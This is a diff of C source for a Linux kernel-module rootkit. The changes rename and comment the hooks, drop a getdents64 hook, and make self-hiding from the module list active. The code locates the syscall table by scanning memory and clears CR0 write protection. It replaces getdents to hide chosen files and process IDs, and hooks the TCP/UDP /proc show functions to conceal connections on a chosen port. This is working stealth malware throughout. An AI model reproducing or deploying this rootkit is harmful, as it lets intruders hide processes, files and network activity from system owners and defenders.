@@ -13,10 +13,9 @@
 #include <linux/rbtree.h>
 #include <linux/hash.h>
 #include <linux/dirent.h>
-
-#include <linux/inet_diag.h>	/* Needed for ntohs */
-#include <net/tcp.h>			/* Needed for struct tcp_seq_afinfo */
-#include <net/udp.h>			/* Needed for struct udp_seq_afinfo */
+#include <linux/inet_diag.h>
+#include <net/tcp.h>
+#include <net/udp.h>
 
 struct linux_dirent {
 	unsigned long  d_ino;     /* Inode number */
@@ -25,16 +24,6 @@ struct linux_dirent {
 	char           d_name[];  /* Filename (null-terminated) */
 };
 
-/*
- * This is not completely implemented yet. The idea is to
- * create an in-memory tree (like the actual /proc filesystem
- * tree) of these proc_dir_entries, so that we can dynamically
- * add new files to /proc.
- *
- * parent/subdir are used for the directory structure (every /proc file has a
- * parent, but "subdir" is empty for all non-directory entries).
- * subdir_node is used to build the rb tree "subdir" of the parent.
- */
 struct proc_dir_entry {
 		unsigned int low_ino;
 		umode_t mode;
@@ -61,107 +50,60 @@ struct proc_dir_entry {
 unsigned long cr0;
 static unsigned long *sys_call_table;
 
-typedef asmlinkage long (*orig_getdents_t)(unsigned int, struct linux_dirent *, unsigned int);
-orig_getdents_t orig_getdents;
+asmlinkage long (*real_getdents) (unsigned int, struct linux_dirent *, unsigned int);
 
-typedef asmlinkage long (*orig_getdents_t64)(unsigned int, struct linux_dirent64 *, unsigned int);
-orig_getdents_t64 orig_getdents64;
+asmlinkage int (*real_tcp4_show) (struct seq_file *, void *);
+asmlinkage int (*real_tcp6_show) (struct seq_file *, void *);
+asmlinkage int (*real_udp4_show) (struct seq_file *, void *);
+asmlinkage int (*real_udp6_show) (struct seq_file *, void *);
 
-asmlinkage int (*original_tcp4_show) (struct seq_file *, void *);
-asmlinkage int (*original_tcp6_show) (struct seq_file *, void *);
-asmlinkage int (*original_udp4_show) (struct seq_file *, void *);
-asmlinkage int (*original_udp6_show) (struct seq_file *, void *);
-
-static int my_tcp4_show(struct seq_file *, void *);
-static int my_tcp6_show(struct seq_file *, void *);
-static int my_udp4_show(struct seq_file *, void *);
-static int my_udp6_show(struct seq_file *, void *);
+static int fake_tcp4_show(struct seq_file *, void *);
+static int fake_tcp6_show(struct seq_file *, void *);
+static int fake_udp4_show(struct seq_file *, void *);
+static int fake_udp6_show(struct seq_file *, void *);
 
 #define START_MEM PAGE_OFFSET
 #define END_MEM ULONG_MAX
 
-static char *hide_mod = "";
-static char *hide_dir = "N0TH1NG";
-static int hide_pid = -1;
-static int hide_port = -1;
+static char *hide_dir = "/"; // Invalid filename in case none is supplied by module parameter
+static int hide_pid = -1; // Invalid PID in case none is supplied by module parameter
+static int hide_port = -1; // Invalid port number in case none is supplied by module parameter
 
-module_param(hide_mod, charp, 0000); // which lkm should be deleted from kernel structures
-module_param(hide_dir, charp, 0000); // which directory/file should be hidden from ls
-module_param(hide_pid, int, 0000);	 // which pid process should be hidden from ps
-module_param(hide_port, int, 0000);	 // which port should be hidden from netstat
-MODULE_LICENSE("GPL v2"); // this actually solves a lot of bugs
+module_param(hide_dir, charp, 0000); // Filename of file/directory to be hidden
+module_param(hide_pid, int, 0000); // PID of process to be hidden
+module_param(hide_port, int, 0000); // Port whose connections must be hidden
 
-// get syscall table dinamically
-unsigned long *
-get_syscall_table_bf(void) {
+MODULE_LICENSE("GPL v2");
+
+// Get the table relating each system call to the routine to be run when called:
+unsigned long *get_syscall_table_bf(void) {
+
     unsigned long *syscall_table;
     unsigned long int i;
 
-    for(i=START_MEM; i<END_MEM; i+=sizeof(void *)){
-        syscall_table = (unsigned long *)i;
+    // Go through the memory testing each possible pointer:
+    for (i = START_MEM; i < END_MEM; i += sizeof(void *)) {
+        // Interpret current position as a pointer to the table:
+        syscall_table = (unsigned long *) i;
 
-        if (syscall_table[__NR_close] == (unsigned long)sys_close)
+        // If the pointer to sys_close is the same as the one dereferenced from the possible table, assume we found the
+        // syscall table:
+        if (syscall_table[__NR_close] == (unsigned long) sys_close) {
             return syscall_table;
+        }
     }
+
     return NULL;
 }
 
-// getdents hook
-asmlinkage static long
-hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
-    struct linux_dirent *t1, *t2;
-    int next, hide;
-    unsigned long hpid, nwarm;
-	long or, tmp;
-    
-	or = (*orig_getdents)(fd, dirp, count);
-    if(!or) return 0;
-
-    t2 = (struct linux_dirent *) kmalloc(or, GFP_KERNEL);
-    __copy_from_user(t2, dirp, or);
-    t1 = t2;
-    tmp = or;
-
-    while(tmp > 0){
-        tmp -= t1->d_reclen;
-        next = 1;
-        hide = 0;
-
-        // ps->find
-        hpid = simple_strtoul(t1->d_name, NULL, 10);
-		if(hide_pid == hpid){
-            struct task_struct *htask = current;
-            do{
-                if(htask->pid == hpid){ 
-                    hide = 1;
-                    break;
-                }
-                htask = next_task(htask);
-            } while(htask != current);
-        }
-
-		// ls + ps->hide
-        if(hide || strstr(t1->d_name, hide_dir)){
-            or -= t1->d_reclen;
-            next = 0;
-            if(tmp) memmove(t1, (char *) t1 + t1->d_reclen, tmp);
-        }
-
-        if(tmp && next) t1 = (struct linux_dirent *) ((char *) t1 + t1->d_reclen);
-    }
-
-    nwarm = __copy_to_user((void *) dirp, (void *) t2, or);
-    kfree(t2);
-
-    return or;
-}
-
+// Hook for intercepting the getdents syscall and hiding arbitrary files/directories given a PID and/or a filename:
 asmlinkage static long fake_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+
     long total_bytes, bytes_remaining;
     struct linux_dirent *real_dents, *dent;
 
     // Get real directory entries:
-    if ((total_bytes = (*orig_getdents)(fd, dirp, count)) == 0) {
+    if ((total_bytes = (*real_getdents)(fd, dirp, count)) == 0) {
         // If number of entries is 0, return 0:
         return 0;
     }
@@ -208,171 +150,129 @@ asmlinkage static long fake_getdents(unsigned int fd, struct linux_dirent *dirp,
     return total_bytes;
 }
 
-//getdents64 hook
-asmlinkage static long
-hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
-    struct linux_dirent64 *t1, *t2;
-    int next, hide;
-    unsigned long hpid, nwarm;
-	long or, tmp;
-    
-	or = (*orig_getdents64)(fd, dirp, count);
-    if(!or) return 0;
+// Hook for intercepting the tcp4_show call and hiding arbitrary connections given a port:
+static int fake_tcp4_show(struct seq_file *m, void *v) {
 
-    t2 = (struct linux_dirent64 *) kmalloc(or, GFP_KERNEL);
-    __copy_from_user(t2, dirp, or);
-    t1 = t2;
-    tmp = or;
+	struct inet_sock *inet;
+	int port;
 
-    while(tmp > 0){
-        tmp -= t1->d_reclen;
-        next = 1;
-        hide = 0;
-
-        // ps->find
-        hpid = simple_strtoul(t1->d_name, NULL, 10);
-		if(hide_pid == hpid){
-            struct task_struct *htask = current;
-            do{
-                if(htask->pid == hpid){ 
-                    hide = 1;
-                    break;
-                }
-                htask = next_task(htask);
-            } while(htask != current);
-        }
-
-		// ls + ps->hide
-        if(hide || strstr(t1->d_name, hide_dir)){
-            or -= t1->d_reclen;
-            next = 0;
-            if(tmp) memmove(t1, (char *) t1 + t1->d_reclen, tmp);
-        }
-
-        if(tmp && next) t1 = (struct linux_dirent64 *) ((char *) t1 + t1->d_reclen);
+	if (SEQ_START_TOKEN == v) {
+		return real_tcp4_show(m, v);
     }
 
-    nwarm = __copy_to_user((void *) dirp, (void *) t2, or);
-    kfree(t2);
-
-    return or;
-}
-
-/* The functions below emulate the original seq functions of tcp and udp but return a
-   length of zero if the given socket uses a hidden port as source or destination port. */
-static int my_tcp4_show(struct seq_file *m, void *v)
-{
-	struct inet_sock *inet;
-	int port;
-
-	if (SEQ_START_TOKEN == v)
-		return original_tcp4_show(m, v);
-
+    // Retrieve source port:
 	inet = inet_sk((struct sock *) v);
 	port = ntohs(inet->inet_sport);
 
-	if (port == hide_port)
+    // If port is the one to be hidden, return nothing:
+	if (port == hide_port) {
 		return 0;
+    }
 
-	return original_tcp4_show(m, v);
+    // Return actual function call return value:
+	return real_tcp4_show(m, v);
 }
 
+// Hook for intercepting the tcp6_show call and hiding arbitrary connections given a port:
+static int fake_tcp6_show(struct seq_file *m, void *v) {
 
-static int my_tcp6_show(struct seq_file *m, void *v)
-{
 	struct inet_sock *inet;
 	int port;
 
-	if (SEQ_START_TOKEN == v)
-		return original_tcp6_show(m, v);
+	if (SEQ_START_TOKEN == v) {
+		return real_tcp6_show(m, v);
+    }
 
+    // Retrieve source port:
 	inet = inet_sk((struct sock *) v);
 	port = ntohs(inet->inet_sport);
 
-	if (port == hide_port)
+    // If port is the one to be hidden, return nothing:
+	if (port == hide_port) {
 		return 0;
+    }
 
-	return original_tcp6_show(m, v);
+    // Return actual function call return value:
+	return real_tcp6_show(m, v);
 }
 
+// Hook for intercepting the udp4_show call and hiding arbitrary connections given a port:
+static int fake_udp4_show(struct seq_file *m, void *v) {
 
-static int my_udp4_show(struct seq_file *m, void *v)
-{
 	struct inet_sock *inet;
 	int port;
 
-	if (SEQ_START_TOKEN == v)
-		return original_udp4_show(m, v);
+	if (SEQ_START_TOKEN == v) {
+		return real_udp4_show(m, v);
+    }
 
+    // Retrieve source port:
 	inet = inet_sk((struct sock *) v);
 	port = ntohs(inet->inet_sport);
 
-	if (port == hide_port)
+    // If port is the one to be hidden, return nothing:
+	if (port == hide_port) {
 		return 0;
+    }
 
-	return original_udp4_show(m, v);
+    // Return actual function call return value:
+	return real_udp4_show(m, v);
 }
 
+// Hook for intercepting the udp6_show call and hiding arbitrary connections given a port:
+static int fake_udp6_show(struct seq_file *m, void *v) {
 
-static int my_udp6_show(struct seq_file *m, void *v)
-{
 	struct inet_sock *inet;
 	int port;
 
-	if (SEQ_START_TOKEN == v)
-		return original_udp6_show(m, v);
+	if (SEQ_START_TOKEN == v) {
+		return real_udp6_show(m, v);
+    }
 
+    // Retrieve source port:
 	inet = inet_sk((struct sock *) v);
 	port = ntohs(inet->inet_sport);
 
-	if (port == hide_port)
+    // If port is the one to be hidden, return nothing:
+	if (port == hide_port) {
 		return 0;
+    }
 
-	return original_udp6_show(m, v);
+    // Return actual function call return value:
+	return real_udp6_show(m, v);
 }
 
-static void module_hide(struct module *mod){
-    /*
-    list_del(&mod->list);
-    kobject_del(&mod->mkobj.kobj);
-    list_del(&mod->mkobj.kobj.entry);
-    */
-}
+// This function is called when the module is loaded, setting up all hooks for hiding stuff:
+static int __init setup_hooks(void) {
 
-static int __init
-syshook_init(void) {
-    sys_call_table = (unsigned long *)get_syscall_table_bf();
+    /* SETUP HOOK FOR HIDING FILES/DIRECTORIES */
+
+    // Try to retrieve syscall table dynamically:
+    sys_call_table = (unsigned long *) get_syscall_table_bf();
+
+    // Read control register:
     cr0 = read_cr0();
 
-    // hide this lkm
-    module_hide(THIS_MODULE);
+    // Hide itself:
+    list_del(&THIS_MODULE->list);
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    list_del(&THIS_MODULE->mkobj.kobj.entry);
 
-    // hide another lkm (lsmod)
-    if(strcmp(hide_mod, "") != 0){
-        struct module *mod;
+    // If syscall table was found, procceed with getdents hooking:
+    if (sys_call_table) {
+        // Save original getdents syscall address:
+        real_getdents = (asmlinkage long (*) (unsigned int, struct linux_dirent *, unsigned int))
+            sys_call_table[__NR_getdents];
 
-        mutex_lock(&module_mutex);
-        mod = find_module(hide_mod);
-        mutex_unlock(&module_mutex);
-
-        if(mod) module_hide(mod);
+        // Replace getdents syscall address in the syscall table by the hook:
+        write_cr0(cr0 & ~0x00010000);
+        sys_call_table[__NR_getdents] = (unsigned long)fake_getdents;
+        write_cr0(cr0);
     }
 
-    //// serious stuff
-    if(sys_call_table == NULL){
-        printk(KERN_INFO "sys_call_table not fount");
-        return -1;
-    }
+    /*******************************************/
 
-	// back up original syscalls addresses
-    orig_getdents = (orig_getdents_t)sys_call_table[__NR_getdents];
-    orig_getdents64 = (orig_getdents_t64)sys_call_table[__NR_getdents64];
-
-	// overwrite their addresses
-    write_cr0(cr0 & ~0x00010000);
-    sys_call_table[__NR_getdents] = (unsigned long)fake_getdents;
-    sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
-    write_cr0(cr0);
+    /* SETUP HOOKS FOR HIDING CONNECTIONS */
 
 	struct rb_root proc_rb_root;
 	struct rb_node *proc_rb_last, *proc_rb_nodeptr;
@@ -380,62 +280,79 @@ syshook_init(void) {
 	struct tcp_seq_afinfo *tcp_seq;
 	struct udp_seq_afinfo *udp_seq;
 
-	/* Get the proc dir entry for /proc/<pid>/net */
+    // Get protocols on /proc/net/:
 	proc_rb_root = init_net.proc_net->subdir;
 
 	proc_rb_last = rb_last(&proc_rb_root);
 	proc_rb_nodeptr = rb_first(&proc_rb_root);
 
+    // Go through all protocol files:
 	while (proc_rb_nodeptr != proc_rb_last) {
 		proc_dir_entryptr = rb_entry(proc_rb_nodeptr, struct proc_dir_entry, subdir_node);
 
-		//PRINT(proc_dir_entryptr->name);
-
-		/* Search for the entries called tcp, tcp6, udp and udp6 */
+		// We want to hide tcp, tcp6, udp and udp6 connections:
 		if (!strcmp(proc_dir_entryptr->name, "tcp")) {
 			tcp_seq = proc_dir_entryptr->data;
-			original_tcp4_show = tcp_seq->seq_ops.show;
 
-			/* Hook the kernel function tcp4_seq_show */
-			tcp_seq->seq_ops.show = my_tcp4_show;
-		} else if (!strcmp(proc_dir_entryptr->name, "tcp6")) {
+            // Save original function call address:
+			real_tcp4_show = tcp_seq->seq_ops.show;
+
+			// Replace address to function by our hook:
+			tcp_seq->seq_ops.show = fake_tcp4_show;
+		}
+        else if (!strcmp(proc_dir_entryptr->name, "tcp6")) {
 			tcp_seq = proc_dir_entryptr->data;
-			original_tcp6_show = tcp_seq->seq_ops.show;
 
-			/* Hook the kernel function tcp6_seq_show */
-			tcp_seq->seq_ops.show = my_tcp6_show;
-		} else if  (!strcmp(proc_dir_entryptr->name, "udp")) {
+            // Save original function call address:
+			real_tcp6_show = tcp_seq->seq_ops.show;
+
+			// Replace address to function by our hook:
+			tcp_seq->seq_ops.show = fake_tcp6_show;
+		}
+        else if  (!strcmp(proc_dir_entryptr->name, "udp")) {
 			udp_seq = proc_dir_entryptr->data;
-			original_udp4_show = udp_seq->seq_ops.show;
 
-			/* Hook the kernel function udp4_seq_show */
-			udp_seq->seq_ops.show = my_udp4_show;
-		} else if (!strcmp(proc_dir_entryptr->name, "udp6")) {
+            // Save original function call address:
+			real_udp4_show = udp_seq->seq_ops.show;
+
+			// Replace address to function by our hook:
+			udp_seq->seq_ops.show = fake_udp4_show;
+		}
+        else if (!strcmp(proc_dir_entryptr->name, "udp6")) {
 			udp_seq = proc_dir_entryptr->data;
-			original_udp6_show = udp_seq->seq_ops.show;
 
-			/* Hook the kernel function udp6_seq_show */
-			udp_seq->seq_ops.show = my_udp6_show;
+            // Save original function call address:
+			real_udp6_show = udp_seq->seq_ops.show;
+
+			// Replace address to function by our hook:
+			udp_seq->seq_ops.show = fake_udp6_show;
 		}
 
 		proc_rb_nodeptr = rb_next(proc_rb_nodeptr);
 	}
+
+    /**************************************/
 
     return 0;
 }
 
-static void __exit
-syshook_cleanup(void){
-    if(orig_getdents){
+// This function is called when the module is unloaded, cleaning up all hooks and therefore restoring the original
+// system state:
+static void __exit cleanup_hooks(void) {
+
+    /* CLEANUP GETDENTS HOOKING */
+
+    // If syscall table was found before, undo getdents hooking:
+    if (sys_call_table) {
+        // Restore original syscall address:
         write_cr0(cr0 & ~0x00010000);
-        sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
+        sys_call_table[__NR_getdents] = (unsigned long)real_getdents;
         write_cr0(cr0);
     }
-    if(orig_getdents64){
-        write_cr0(cr0 & ~0x00010000);
-        sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
-        write_cr0(cr0);
-    }
+
+    /****************************/
+
+    /* CLEANUP NET PROTOCOLS HOOKING */
 
 	struct rb_root proc_rb_root;
 	struct rb_node *proc_rb_last, *proc_rb_nodeptr;
@@ -443,32 +360,47 @@ syshook_cleanup(void){
 	struct tcp_seq_afinfo *tcp_seq;
 	struct udp_seq_afinfo *udp_seq;
 
+    // Get protocols on /proc/net/:
 	proc_rb_root = init_net.proc_net->subdir;
+
 	proc_rb_last = rb_last(&proc_rb_root);
 	proc_rb_nodeptr = rb_first(&proc_rb_root);
 
+    // Go through all protocol files:
 	while (proc_rb_nodeptr != proc_rb_last) {
 		proc_dir_entryptr = rb_entry(proc_rb_nodeptr, struct proc_dir_entry, subdir_node);
 
-		//PRINT(proc_dir_entryptr->name);
-
+		// We want to unhide tcp, tcp6, udp and udp6 connections:
 		if (!strcmp(proc_dir_entryptr->name, "tcp")) {
 			tcp_seq = proc_dir_entryptr->data;
-			tcp_seq->seq_ops.show = original_tcp4_show;
-		} else if (!strcmp(proc_dir_entryptr->name, "tcp6")) {
+
+            // Restore original function address:
+			tcp_seq->seq_ops.show = real_tcp4_show;
+		}
+        else if (!strcmp(proc_dir_entryptr->name, "tcp6")) {
 			tcp_seq = proc_dir_entryptr->data;
-			tcp_seq->seq_ops.show = original_tcp6_show;
-		} else if (!strcmp(proc_dir_entryptr->name, "udp")) {
+
+            // Restore original function address:
+			tcp_seq->seq_ops.show = real_tcp6_show;
+		}
+        else if (!strcmp(proc_dir_entryptr->name, "udp")) {
 			udp_seq = proc_dir_entryptr->data;
-			udp_seq->seq_ops.show = original_udp4_show;
-		} else if (!strcmp(proc_dir_entryptr->name, "udp6")) {
+
+            // Restore original function address:
+			udp_seq->seq_ops.show = real_udp4_show;
+		}
+        else if (!strcmp(proc_dir_entryptr->name, "udp6")) {
 			udp_seq = proc_dir_entryptr->data;
-			udp_seq->seq_ops.show = original_udp6_show;
+
+            // Restore original function address:
+			udp_seq->seq_ops.show = real_udp6_show;
 		}
 
 		proc_rb_nodeptr = rb_next(proc_rb_nodeptr);
 	}
+
+    /*********************************/
 }
 
-module_init(syshook_init);
-module_exit(syshook_cleanup);
+module_init(setup_hooks);
+module_exit(cleanup_hooks);
